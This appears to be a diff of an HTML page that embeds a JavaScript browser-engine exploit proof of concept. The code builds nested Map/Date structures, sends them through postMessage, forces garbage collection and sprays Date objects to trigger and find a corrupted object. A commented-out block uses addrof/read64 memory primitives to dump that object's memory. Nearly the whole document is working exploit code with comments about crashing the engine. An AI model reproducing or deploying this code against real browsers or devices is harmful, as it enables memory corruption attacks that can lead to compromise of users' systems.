@@ -11,96 +11,97 @@
             background-color: #000;
             color: #fff;
         }
+    </style>
+</head>
+<body>
+    <script type="module">
+        import { debug_log } from '/module/utils.mjs';
 
-//import { mem } from '/module/mem.mjs';
-import { debug_log } from '/module/utils.mjs';
+        export function sleep(ms=0) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
 
-export function sleep(ms=0) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
+        function gc() {
+            new Uint8Array(4 * 1024 * 1024);
+        }
 
-function gc() {
-    new Uint8Array(4 * 1024 * 1024);
-}
+        function spray() {
+            const tmp = [];
+            for (let j = 0; j < 1024; j++) {
+                const d = new Date(0xbeef);
+                tmp.push(d);
+            }
+        }
 
-function spray() {
-    const tmp = [];
-    for (let j = 0; j < 1024; j++) {
-        const d = new Date(0xbeef);
-        tmp.push(d);
-    }
-}
-
-void async function main() {
-    const num_elems = 800;
-    let root = new Map();
-    let msg = root;
-    let foo = [];
-    for (let i = 0; i < 100; i++) {
-        foo.push(new Date(0xffff));
-    }
-    for (let i = 0; i < num_elems; i++) {
-        const d = new Date(i);
-        const map = new Map();
-        msg.set(d, [map, foo]);
-        msg = map;
-    }
-    msg = root;
-
-    let data2 = null;
-    let idx = null;
-    loop: while (true) {
-        let data = null;
-        const prom = new Promise(resolve => {
-            addEventListener('message', event => {
-                data = event;
-                resolve();
-            }, {once: true});
-        });
-        postMessage(msg, origin);
-        await prom;
-        data = data.data;
-
-        gc();
-        await sleep();
-
-        let tmp_i = null;
-        try {
+        void async function main() {
+            const num_elems = 800;
+            let root = new Map();
+            let msg = root;
+            let foo = [];
+            for (let i = 0; i < 100; i++) {
+                foo.push(new Date(0xffff));
+            }
             for (let i = 0; i < num_elems; i++) {
-                tmp_i = i;
-                if (data.keys().next().value.getTime() === 0xffff) {
-                    idx = i;
+                const d = new Date(i);
+                const map = new Map();
+                msg.set(d, [map, foo]);
+                msg = map;
+            }
+            msg = root;
+
+            let data2 = null;
+            let idx = null;
+            loop: while (true) {
+                let data = null;
+                const prom = new Promise(resolve => {
+                    addEventListener('message', event => {
+                        data = event;
+                        resolve();
+                    }, {once: true});
+                });
+                postMessage(msg, origin);
+                await prom;
+                data = data.data;
+
+                gc();
+                await sleep();
+
+                let tmp_i = null;
+                try {
+                    for (let i = 0; i < num_elems; i++) {
+                        tmp_i = i;
+                        if (data.keys().next().value.getTime() === 0xffff) {
+                            idx = i;
+                            break loop;
+                        }
+                        data = data.values().next().value[0];
+                    }
+                } catch {
+                    idx = tmp_i;
+                    data2 = data.keys().next().value;
                     break loop;
                 }
-                data = data.values().next().value[0];
             }
-        } catch {
-            idx = tmp_i;
-            data2 = data.keys().next().value;
-            break loop;
-        }
-    }
 
-    // comment this out if you just want to crash
-    // import mem if you want to read the corrupted object
-    /*
-    debug_log('normal Date:');
-    const tmp_d = new Date();
-    const date_p = mem.addrof(tmp_d);
-    for (let i = 0; i < 8*8; i += 8) {
-        debug_log(date_p.read64(i));
-    }
-    debug_log('corrupted:');
-    const data_p = mem.addrof(data2);
-    for (let i = 0; i < 8*8; i += 8) {
-        debug_log(data_p.read64(i));
-    }
-    */
+            // comment this out if you just want to crash
+            // import mem if you want to read the corrupted object
+            /*
+            debug_log('normal Date:');
+            const tmp_d = new Date();
+            const date_p = mem.addrof(tmp_d);
+            for (let i = 0; i < 8*8; i += 8) {
+                debug_log(date_p.read64(i));
+            }
+            debug_log('corrupted:');
+            const data_p = mem.addrof(data2);
+            for (let i = 0; i < 8*8; i += 8) {
+                debug_log(data_p.read64(i));
+            }
+            */
 
-    alert('try crash');
-    debug_log(data2);
-}();
-
-
+            alert('try crash');
+            debug_log(data2);
+        }();
+    </script>
 </body>
 </html>
